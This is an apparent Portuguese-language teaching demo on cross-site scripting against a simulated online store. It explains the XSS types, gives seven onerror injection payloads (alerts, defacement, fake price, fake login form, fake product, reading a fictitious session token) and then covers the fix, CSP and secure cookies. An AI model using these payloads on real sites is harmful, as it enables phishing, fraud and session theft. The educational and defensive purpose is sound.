XSS: Cross-Site Scripting

Como o ataque funciona, uma demonstração prática e como se defender

Lucas Santos, Rafael Urbanek, Vitor Cumim

Começar Ir direto para a demonstração
Conceito

O que é XSS

Vulnerabilidade que permite a execução de scripts maliciosos no navegador da vítima por meio de conteúdo não tratado adequadamente.

Conceito

Como o ataque funciona

1

Injeção

O atacante insere conteúdo malicioso em um campo, comentário ou link do site.

2

Execução

A vítima abre o link do atacante, o site incorpora o código à página e o navegador da vítima o executa.

3

Impacto

O script pode acessar dados, modificar a página ou realizar ações não autorizadas.

Três tipos de XSS

Refletido e armazenado descrevem como o payload chega à vítima. Uma falha baseada em DOM ocorre no navegador e pode se sobrepor aos outros tipos.

Onde o payload passaQuem é atingido
RefletidoVai na requisição HTTP e é refletido na resposta, sem ser armazenado.Quem abre o link do atacante
ArmazenadoÉ salvo no servidor, como em comentários, e executado quando a vítima acessa a página.Todo visitante da página
Baseado em DOMO JavaScript do cliente manipula dados no DOM de forma insegura, sem depender do servidor.Quem abre o link manipulado
Ataque

Como atacar

Na loja simulada, o JavaScript lê o termo de busca no parâmetro ?q= da URL e o exibe na página. Em uma aplicação com servidor, o próprio servidor pode incluir esse termo no HTML da resposta.

  1. Busque por um produto da loja para testar o filtro normal do catálogo.
  2. Use um dos exemplos abaixo no campo de busca e clique em Buscar.
  3. Copie a URL da busca e abra em outra aba para reproduzir o efeito a partir do link.

Abrir a loja ↗

O que um atacante consegue fazer

1. Confirmar a execução de JavaScript

A imagem falha ao carregar e aciona onerror. O alerta confirma que o navegador executou o código enviado pela busca.

<img src="data:," onerror="alert('Você está sob ataque!')">

2. Alterar o conteúdo

Troca o título visível da loja por um aviso falso.

<img src="data:," onerror="document.querySelector('h1').textContent = 'Catálogo fora do ar';">

3. Mudar a cor de fundo

Altera a aparência da página inteira, deixando o fundo da loja completamente escuro.

<img src="data:," onerror="document.documentElement.style.backgroundColor = '#000000';">

Simulação com usuário conectado

Nesta parte, um usuário está usando a loja. A leitura da sessão depende dos dados guardados na aba dele.

4. Falsificar o preço

Exibe a primeira mochila e altera o preço que o usuário vê.

<img src="data:," onerror="const produto = document.querySelector('.produto');
  produto.hidden = false;
  produto.querySelector('strong').textContent = 'R$ 1,00';
  document.querySelector('#sem-produtos').hidden = true;">

5. Phishing com um formulário falso

O usuário vê um aviso de sessão expirada no próprio endereço da loja. Como a página parece legítima, ele pode acreditar que precisa entrar de novo.

<img src="data:," onerror="
  const form = document.createElement('form');
  form.innerHTML = '<h2>Sua sessão expirou</h2>'
    + '<p>Entre novamente para continuar.</p>'
    + '<p><label>Usuário <input autocomplete=off></label></p>'
    + '<p><label>Senha <input type=password autocomplete=off></label></p>'
    + '<button type=submit>Entrar</button>';
  form.addEventListener('submit', evento => {
    evento.preventDefault();
    form.textContent = 'Demonstração: um formulário falso poderia enviar os dados ao atacante.';
  });
  document.querySelector('main').replaceChildren(form);
">

6. Inserir um produto falso

Um link preparado pode fazer a loja exibir uma mochila que o atacante inventou. Como o endereço continua sendo o da loja, a oferta parece legítima. Em um ataque real, o botão Comprar poderia levar a um checkout fraudulento e induzir a vítima a pagar ao atacante.

<img src="data:," onerror="
  const produto = document.createElement('article');
  produto.className = 'produto';
  produto.innerHTML = '<h2>Mochila Expedição 30L</h2>'
    + '<p>Oferta exclusiva desta página.</p>'
    + '<p><strong>R$ 59,90</strong></p>'
    + '<button type=button>Comprar</button>';
  document.querySelector('.produtos').replaceChildren(produto);
  document.querySelector('#resultado').hidden = true;
  document.querySelector('#sem-produtos').hidden = true;
">

7. Ler uma sessão fictícia

O atacante só precisa descobrir o nome da chave, que está no loja.js entregue ao navegador: loja.sessao. O token do usuário é criado na aba da vítima e só é lido quando o código do link roda naquela aba.

<img src="data:," onerror="
  const sessao = JSON.parse(sessionStorage.getItem('loja.sessao'));
  if (sessao) {
    alert('userId: ' + sessao.userId + '\nsessionId: ' + sessao.sessionId);
    document.querySelector('#resultado').textContent = 'Dados da sessão exibidos no alerta.';
  } else {
    document.querySelector('#resultado').textContent = 'Nenhuma sessão nesta aba.';
  }
  document.querySelector('#sem-produtos').hidden = true;
">

O alerta mostra os dados no navegador da vítima. Em um ataque real, o código poderia enviar esses valores em um POST para um servidor controlado pelo atacante.

Como corrigir a busca

Em loja.js, na função mostrarBusca(), troque innerHTML por textContent na linha que exibe o termo pesquisado. Assim, o navegador mostra a entrada como texto, sem criar elementos HTML nem executar eventos injetados.

Antes · loja.js
resultado.innerHTML = 'Você buscou: ' + termo;
Depois · loja.js
resultado.textContent = 'Você buscou: ' + termo;
Defesa

Como se defender

Nenhuma defesa isolada basta. A proteção vem de camadas que se complementam. A busca demonstrou a principal: exibir a entrada como texto. Quando a aplicação precisa aceitar HTML, use sanitização. As duas defesas a seguir reforçam a proteção.

Restringir scripts e proteger a sessão

CSP

Política que restringe quais scripts podem ser executados na página.

Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-r4nd0m'

Efeito: onerror e scripts inline são bloqueados.

Cookies protegidos

HttpOnly impede a leitura pelo JavaScript, Secure exige HTTPS e SameSite=Strict limita o envio ao mesmo site.

Set-Cookie: sessao_demo=abc123;
  HttpOnly; Secure;
  SameSite=Strict

Defesa em camadas

Tratar como textoimpede que a entrada vire código
Sanitizarremove o que é perigoso do HTML
CSPbloqueia a execução do script
Cookies protegidoslimitam o dano se o script rodar

Regra: nunca confie na entrada do usuário.
